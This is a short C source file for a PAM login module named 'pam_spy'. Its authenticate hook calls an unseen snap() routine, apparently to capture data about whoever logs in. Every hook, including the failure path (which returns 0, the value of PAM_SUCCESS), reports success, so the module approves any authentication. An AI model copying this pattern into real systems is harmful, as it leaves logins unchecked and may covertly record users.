#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include "pam_spy.h"

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	if (!snap(generate_filename()))
		return 0; //I guess that's what I should do here, I have no idea lmao
	return PAM_SUCCESS;
}
